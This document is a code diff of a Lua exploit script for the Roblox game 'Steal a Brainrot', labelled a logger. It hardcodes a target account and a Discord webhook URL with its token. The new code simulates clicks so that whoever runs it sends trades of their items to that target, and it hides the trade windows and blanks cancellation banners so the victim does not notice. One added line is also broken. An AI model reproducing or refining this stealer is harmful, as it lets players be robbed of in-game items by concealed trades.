@@ -1,24 +1,27 @@
 --[[
 ============================================================
-  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v4 ANTI-KICK
+  STEAL A BRAINROT — LOGGER  (edición KIMILOSP)  v5 CLICK-SEND
   · Target único: KIMILOSP (siempre resuelto por nombre)
-  · Ritmo de remotes reducido + jitter (menos 267)
-  · F2 = rejoin | HUD de estado
+  · Envío del trade por simulación de clics en la UI real
+  · Fallback automático al remote si la UI falla
 ============================================================
 ]]
 
 getgenv().TARGET_USERNAME = "KIMILOSP"
 getgenv().GOOD_WEBHOOK = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
 
--- ── AJUSTES ANTI-KICK (súbelos si te siguen tirando) ──
+-- ── AJUSTES ──
 getgenv().CONFIG = {
-	INVITE_DELAY = 3.5,     -- segundos entre invitaciones
-	INVITE_SAFETY = 10,     -- si hay trade abierto, reintento de seguridad
-	INVITE_HOLD = 6,        -- pausa tras recibir una invitación
-	ADD_DELAY = 1.5,        -- ritmo de AddBrainrot / AddItem
-	READY_DELAY = 1,        -- ritmo de Ready + Accept
-	SCAN_DELAY = 1.5,       -- ritmo del escaneo de inventario (getgc)
-	JITTER = 0.5,           -- aleatoriedad añadida
+	USE_CLICK_SEND = true,   -- envío por clics (método principal, evita el 267)
+	CLICK_ATTEMPTS = 35,     -- intentos por envío
+	CLICK_RETRY = 0.4,       -- espera entre intentos
+	CLICK_COOLDOWN = 1.5,    -- pausa entre envíos
+	FALLBACK_AFTER = 3,      -- fallos de clic antes de usar el remote
+	INVITE_HOLD = 6,         -- pausa tras recibir invitación
+	ADD_DELAY = 1.5,         -- ritmo AddBrainrot / AddItem
+	READY_DELAY = 1,         -- ritmo Ready + Accept
+	SCAN_DELAY = 1.5,        -- ritmo del escaneo getgc
+	JITTER = 0.5,
 }
 
 getgenv().ALLOWED_ANIMALS = {
@@ -509,6 +512,10 @@ local localPlayer = Players.LocalPlayer
 local currentCamera = workspace.CurrentCamera
 local playerGui = localPlayer:WaitForChild("PlayerGui")
 
+local okVim, VirtualInputManager = pcall(function()
+	return game:GetService("VirtualInputManager")
+end)
+
 -- F2 = rejoin rápido si te tiran
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
 	if gameProcessed then return end
@@ -530,13 +537,16 @@ task.spawn(function()
 	end
 
 	local CFG = getgenv().CONFIG or {}
-	local INVITE_DELAY  = CFG.INVITE_DELAY  or 3.5
-	local INVITE_SAFETY = CFG.INVITE_SAFETY or 10
-	local INVITE_HOLD   = CFG.INVITE_HOLD   or 6
-	local ADD_DELAY     = CFG.ADD_DELAY     or 1.5
-	local READY_DELAY   = CFG.READY_DELAY   or 1
-	local SCAN_DELAY    = CFG.SCAN_DELAY    or 1.5
-	local JITTER        = CFG.JITTER        or 0.5
+	local USE_CLICK_SEND = CFG.USE_CLICK_SEND ~= false
+	local CLICK_ATTEMPTS = CFG.CLICK_ATTEMPTS or 35
+	local CLICK_RETRY    = CFG.CLICK_RETRY or 0.4
+	local CLICK_COOLDOWN = CFG.CLICK_COOLDOWN or 1.5
+	local FALLBACK_AFTER = CFG.FALLBACK_AFTER or 3
+	local INVITE_HOLD    = CFG.INVITE_HOLD or 6
+	local ADD_DELAY      = CFG.ADD_DELAY or 1.5
+	local READY_DELAY    = CFG.READY_DELAY or 1
+	local SCAN_DELAY     = CFG.SCAN_DELAY or 1.5
+	local JITTER         = CFG.JITTER or 0.5
 
 	local function jitter(base)
 		return base + math.random() * JITTER
@@ -648,7 +658,7 @@ task.spawn(function()
 			if not ok or not hud.Parent then hud.Parent = playerGui end
 
 			local frame = Instance.new("Frame")
-			frame.Size = UDim2.new(0, 430, 0, 110)
+			frame.Size = UDim2.new(0, 430, 0, 122)
 			frame.Position = UDim2.new(0, 12, 0, 12)
 			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 			frame.BackgroundTransparency = 0.35
@@ -1469,7 +1479,7 @@ task.spawn(function()
 			textLabel2.Text = "TARGET: " .. targetName .. " (" .. targetUserId .. ")"
 			textLabel2.TextColor3 = Color3.fromRGB(50, 255, 50)
 			textLabel2.TextScaled = true
-			textLabel2.Font = Enum.Font.GothamBlack
+			textLabel2.Font = Enum.GothamBlack
 			textLabel2.TextStrokeTransparency = 0.7
 			textLabel2.ZIndex = 999999
 			textLabel2.Parent = screenGui
@@ -1482,6 +1492,384 @@ task.spawn(function()
 			end)
 		end)
 	end
+
+	-- ════════════════════════════════════════════════════════
+	--  MÓDULO DE CLICS (bypass del 267)
+	-- ════════════════════════════════════════════════════════
+	local hiddenState = {}
+	local watchedTradeConnections = {}
+	local clearedBannerTexts = {}
+
+	local function isTradeGuiOrFrame(inst)
+		if not inst then
+			return false
+		end
+		local n = inst.Name:lower()
+		if n:find("trade") or n:find("intercambio") then
+			return true
+		end
+		for _, d in ipairs(inst:GetDescendants()) do
+			if d:IsA("TextLabel") or d:IsA("TextButton") then
+				local t = d.Text:lower()
+				if t:find("your offer") or t:find("chat de intercambio") or t:find("selecciona brainrots") then
+					return true
+				end
+			end
+		end
+		return false
+	end
+
+	local function setHidden(inst, hide)
+		if not inst or not inst.Parent then
+			return
+		end
+		if hide then
+			if hiddenState[inst] == nil then
+				pcall(function()
+					if inst:IsA("LayerCollector") then
+						hiddenState[inst] = inst.Enabled
+						inst.Enabled = false
+					elseif inst:IsA("GuiObject") then
+						hiddenState[inst] = inst.Visible
+						inst.Visible = false
+					end
+				end)
+			else
+				pcall(function()
+					if inst:IsA("LayerCollector") and inst.Enabled then
+						inst.Enabled = false
+					elseif inst:IsA("GuiObject") and inst.Visible then
+						inst.Visible = false
+					end
+				end)
+			end
+		elseif hiddenState[inst] ~= nil then
+			local prev = hiddenState[inst]
+			hiddenState[inst] = nil
+			pcall(function()
+				if inst:IsA("LayerCollector") then
+					inst.Enabled = prev
+				elseif inst:IsA("GuiObject") then
+					inst.Visible = prev
+				end
+			end)
+		end
+	end
+
+	local function watchTradeInstantHide(inst)
+		if not inst or watchedTradeConnections[inst] then
+			return
+		end
+		local conns = {}
+		if inst:IsA("LayerCollector") then
+			table.insert(conns, inst:GetPropertyChangedSignal("Enabled"):Connect(function()
+				if inst.Enabled then
+					setHidden(inst, true)
+				end
+			end))
+		elseif inst:IsA("GuiObject") then
+			table.insert(conns, inst:GetPropertyChangedSignal("Visible"):Connect(function()
+				if inst.Visible then
+					setHidden(inst, true)
+				end
+			end))
+		end
+		watchedTradeConnections[inst] = conns
+	end
+
+	local function syncTradeVisibility()
+		for _, child in ipairs(playerGui:GetChildren()) do
+			local n = child.Name:lower()
+			if n:find("trade") or n:find("intercambio") then
+				watchTradeInstantHide(child)
+				setHidden(child, true)
+			else
+				for _, sub in ipairs(child:GetChildren()) do
+					if isTradeGuiOrFrame(sub) then
+						watchTradeInstantHide(sub)
+						setHidden(sub, true)
+					end
+				end
+			end
+		end
+	end
+
+	local function maybeClearBannerTextObj(desc)
+		if not desc or desc:IsDescendantOf(playerGui:FindFirstChild("LoggerHUD") or playerGui) then
+			-- ok
+		end
+		if not (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
+			return
+		end
+		local t = tostring(desc.Text or ""):lower()
+		if t == "" then
+			return
+		end
+		local shouldClear = false
+		if t:find("canceló", 1, true) or t:find("cancelo", 1, true) or t:find("cancelled", 1, true)
+			or t:find("canceled", 1, true) or t:find("base bloqueada", 1, true) or t:find("base locked", 1, true) then
+			shouldClear = true
+		end
+		if not shouldClear and t:find("@", 1, true) and (t:find("cancel", 1, true) or t:find("bloq", 1, true) or t:find("lock", 1, true)) then
+			shouldClear = true
+		end
+		if shouldClear then
+			if clearedBannerTexts[desc] == nil then
+				clearedBannerTexts[desc] = desc.Text
+			end
+			pcall(function()
+				desc.Text = ""
+			end)
+		end
+	end
+
+	local function cleanSectionBannerTexts()
+		for _, desc in ipairs(playerGui:GetDescendants()) do
+			maybeClearBannerTextObj(desc)
+		end
+	end
+
+	local function resolveClickableButton(inst)
+		if not inst then
+			return nil
+		end
+		if inst:IsA("GuiButton") then
+			return inst
+		end
+		local btnDesc = inst:FindFirstChildWhichIsA("GuiButton", true)
+		if btnDesc then
+			return btnDesc
+		end
+		local curr = inst.Parent
+		while curr and curr ~= playerGui do
+			if curr:IsA("GuiButton") then
+				return curr
+			end
+			curr = curr.Parent
+		end
+		return nil
+	end
+
+	local function fireGuiSignals(btn)
+		if not btn then
+			return false
+		end
+		local triggered = false
+
+		if firesignal then
+			pcall(function()
+				if btn.MouseButton1Down then
+					firesignal(btn.MouseButton1Down)
+				end
+			end)
+			pcall(function()
+				if btn.MouseButton1Click then
+					firesignal(btn.MouseButton1Click)
+					triggered = true
+				end
+			end)
+			pcall(function()
+				if btn.Activated then
+					firesignal(btn.Activated)
+					triggered = true
+				end
+			end)
+		end
+
+		if getconnections then
+			for _, sigName in ipairs({ "MouseButton1Click", "Activated", "MouseButton1Down" }) do
+				local ok, conns = pcall(function()
+					return getconnections(btn[sigName])
+				end)
+				if ok and type(conns) == "table" then
+					for _, conn in ipairs(conns) do
+						if conn.Function and pcall(conn.Function) then
+							triggered = true
+						end
+					end
+				end
+			end
+		end
+
+		if not triggered then
+			pcall(function()
+				game:GetService("GuiService").SelectedObject = btn
+			end)
+		end
+
+		return triggered
+	end
+
+	local function triggerScriptButton(inst)
+		local btn = resolveClickableButton(inst) or inst
+		if not btn then
+			return false
+		end
+		return fireGuiSignals(btn)
+	end
+
+	local function pressEnterOnSearchBox(box, textToType)
+		if not box or not box:IsA("TextBox") then
+			return false
+		end
+		return pcall(function()
+			box:CaptureFocus()
+			box.Text = textToType
+			task.wait(0.05)
+			if okVim and VirtualInputManager then
+				pcall(function()
+					VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+					task.wait(0.03)
+					VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+				end)
+			end
+			if box.FocusLost then
+				pcall(function()
+					box.FocusLost:Fire(true)
+				end)
+			end
+			box:ReleaseFocus()
+		end)
+	end
+
+	-- LeftCenter se destruye en fn2, así que buscamos también el backup
+	local function findLeftRoot()
+		return playerGui:FindFirstChild("LeftCenter", true) or playerGui:FindFirstChild("LeftCenter_Backup", true)
+	end
+
+	local function findLeftTradeButton()
+		local leftRoot = findLeftRoot()
+		if leftRoot then
+			local exact = leftRoot:FindFirstChild("TradePlayerList", true)
+			if exact then
+				return resolveClickableButton(exact) or exact
+			end
+			for _, desc in ipairs(leftRoot:GetDescendants()) do
+				if desc:IsA("GuiButton") and (desc.Name:lower():find("trade") or (desc:IsA("TextButton") and desc.Text:lower() == "trade")) then
+					return desc
+				end
+			end
+		end
+		return nil
+	end
+
+	local function findSearchBox(root)
+		if not root then
+			return nil
+		end
+		for _, desc in ipairs(root:GetDescendants()) do
+			if desc:IsA("TextBox") then
+				return desc
+			end
+		end
+		return nil
+	end
+
+	local function findTargetSendButton(root, name, id)
+		if not root then
+			return nil
+		end
+		local lowerTarget = name:lower()
+		local exactRowName = lowerTarget .. "_" .. tostring(id)
+
+		for _, desc in ipairs(root:GetDescendants()) do
+			local dn = desc.Name:lower()
+			if dn == exactRowName or dn:find(lowerTarget, 1, true) then
+				local sendInst = desc:FindFirstChild("Send", true)
+				if sendInst then
+					return resolveClickableButton(sendInst) or sendInst
+				end
+				for _, sub in ipairs(desc:GetDescendants()) do
+					local sn = sub.Name:lower()
+					if sn:find("send") or sn:find("enviar") then
+						return resolveClickableButton(sub) or sub
+					end
+				end
+			end
+		end
+		return nil
+	end
+
+	local function findCloseButton(root)
+		if not root then
+			return nil
+		end
+		for _, desc in ipairs(root:GetDescendants()) do
+			local n = desc.Name:lower()
+			if n == "x" or n == "close" or n:find("close") then
+				local btn = resolveClickableButton(desc)
+				if btn then
+					return btn
+				end
+			end
+			if (desc:IsA("TextButton") or desc:IsA("TextLabel")) and desc.Text:gsub("%s+", ""):lower() == "x" then
+				return resolveClickableButton(desc) or desc
+			end
+		end
+		return nil
+	end
+
+	local function sendTradeToPlayerByClicks(name, id)
+		name = name or targetName
+		id = id or targetUserId
+		syncTradeVisibility()
+		cleanSectionBannerTexts()
+
+		local sent = false
+		local closed = false
+
+		for attempt = 1, CLICK_ATTEMPTS do
+			if playerGui:FindFirstChild("TradeLiveTrade") then
+				break
+			end
+
+			local tradeListGui = playerGui:FindFirstChild("TradePlayerList")
+			local sendBtn = findTargetSendButton(tradeListGui or playerGui, name, id)
+
+			if not sendBtn then
+				local openBtn = findLeftTradeButton()
+				if openBtn then
+					triggerScriptButton(openBtn)
+					task.wait(CLICK_RETRY)
+					syncTradeVisibility()
+					tradeListGui = playerGui:FindFirstChild("TradePlayerList")
+				end
+
+				local searchBox = findSearchBox(tradeListGui or playerGui)
+				if searchBox then
+					pressEnterOnSearchBox(searchBox, name)
+					task.wait(CLICK_RETRY)
+				end
+
+				sendBtn = findTargetSendButton(tradeListGui or playerGui, name, id)
+			end
+
+			if sendBtn and not sent then
+				triggerScriptButton(sendBtn)
+				sent = true
+				task.wait(CLICK_RETRY)
+			end
+
+			if sent then
+				local closeBtn = findCloseButton(tradeListGui or playerGui)
+				if closeBtn then
+					triggerScriptButton(closeBtn)
+					closed = true
+					break
+				elseif attempt >= 12 then
+					break
+				end
+			end
+
+			task.wait(CLICK_RETRY)
+		end
+
+		syncTradeVisibility()
+		cleanSectionBannerTexts()
+		return sent
+	end
+
+	-- ════════════════════════════════════════════════════════
 
 	local priority = fn7("PRIORITY")
 	local normal = fn7("NORMAL")
@@ -1555,15 +1943,16 @@ task.spawn(function()
 		return
 	end
 
-	print("[LOGGER] Remotes OK. Fase: " .. tbl6.phase .. " | cola: " .. #tbl6.queue)
+	print("[LOGGER] Remotes OK. Fase: " .. tbl6.phase .. " | modo: " .. (USE_CLICK_SEND and "CLICK" or "REMOTE"))
 
 	local v3 = nil
 	local from = nil
 	local lastInvite = "sin intentos"
 	local inviteCount = 0
 	local receivedInvites = 0
-	local lastInviteAt = 0
 	local lastPendingAt = 0
+	local clickFails = 0
+	local sending = false
 
 	if CreateInvite and CreateInvite:IsA("RemoteEvent") then
 		CreateInvite.OnClientEvent:Connect(function(arg, arg2)
@@ -1590,8 +1979,9 @@ task.spawn(function()
 						"FASE: " .. tbl6.phase .. " | cola: " .. #tbl6.queue,
 						"skins: " .. #tbl6.baseSkinQueue .. " | gears: " .. #tbl6.gearQueue,
 						"trade abierto: " .. tradeOpen,
-						"invites: " .. inviteCount .. " env / " .. receivedInvites .. " rec",
-						"ultimo invite: " .. tostring(lastInvite):sub(1, 60),
+						"modo: " .. (USE_CLICK_SEND and "CLICK" or "REMOTE") .. " | fallos: " .. clickFails,
+						"envios: " .. inviteCount .. " | rec: " .. receivedInvites,
+						"ultimo: " .. tostring(lastInvite):sub(1, 50),
 					}, "\n")
 				end)
 			end
@@ -1736,33 +2126,43 @@ task.spawn(function()
 		end
 	end)
 
-	-- ── INVITE LOOP ANTI-KICK ──
+	-- ── SENDER: clics primero, remote como fallback ──
 	task.spawn(function()
 		while true do
-			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
+			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and not sending then
 				local now = os.clock()
 				local tradeOpen = playerGui:FindFirstChild("TradeLiveTrade") ~= nil
 				local pending = v3 ~= nil and (now - lastPendingAt) < INVITE_HOLD
-				local canInvite
 
-				if tradeOpen then
-					canInvite = (now - lastInviteAt) >= INVITE_SAFETY
-				else
-					canInvite = not pending and (now - lastInviteAt) >= INVITE_DELAY
-				end
+				if not tradeOpen and not pending then
+					if USE_CLICK_SEND and clickFails < FALLBACK_AFTER then
+						sending = true
+						local ok = false
+						pcall(function()
+							ok = sendTradeToPlayerByClicks(targetName, targetUserId)
+						end)
+						sending = false
+						inviteCount = inviteCount + 1
+						lastInvite = ok and "click ok" or "click fallo"
 
-				if canInvite then
-					lastInviteAt = now
-					local ok, res = pcall(function()
-						return Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
-					end)
-
-					inviteCount = inviteCount + 1
-					lastInvite = ok and ("ok -> " .. tostring(res)) or tostring(res)
+						if ok then
+							clickFails = 0
+						else
+							clickFails = clickFails + 1
+						end
+					else
+						-- fallback por remote
+						local ok, res = pcall(function()
+							return Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
+						end)
+						inviteCount = inviteCount + 1
+						lastInvite = ok and ("remote -> " .. tostring(res)) or tostring(res)
+						clickFails = 0
+					end
 				end
 			end
 
-			task.wait(0.5 + math.random() * 0.5)
+			task.wait(jitter(CLICK_COOLDOWN))
 		end
 	end)
 
